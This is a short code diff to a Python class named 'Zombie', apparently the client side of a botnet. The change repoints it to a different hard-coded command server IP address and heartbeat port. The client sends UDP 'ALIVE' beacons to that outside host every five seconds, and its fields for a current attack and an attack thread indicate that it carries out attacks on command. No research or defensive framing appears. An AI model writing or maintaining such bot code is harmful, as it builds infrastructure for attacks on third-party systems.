@@ -12,7 +12,7 @@ logging.basicConfig(
 class Zombie:
     def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.server_ip = "89.35.130.4"  # Заменить на реальный IP
+        self.server_ip = "212.41.7.231"  # Заменить на реальный IP
         self.running = True
         self.current_attack = None
         self.attack_thread = None
@@ -24,7 +24,7 @@ class Zombie:
     def heartbeat(self):
         while self.running:
             try:
-                self.sock.sendto(b"ALIVE", (self.server_ip, 20685))
+                self.sock.sendto(b"ALIVE", (self.server_ip, 6358))
                 time.sleep(5)
             except Exception as e:
                 logging.error(f"Heartbeat error: {str(e)}")
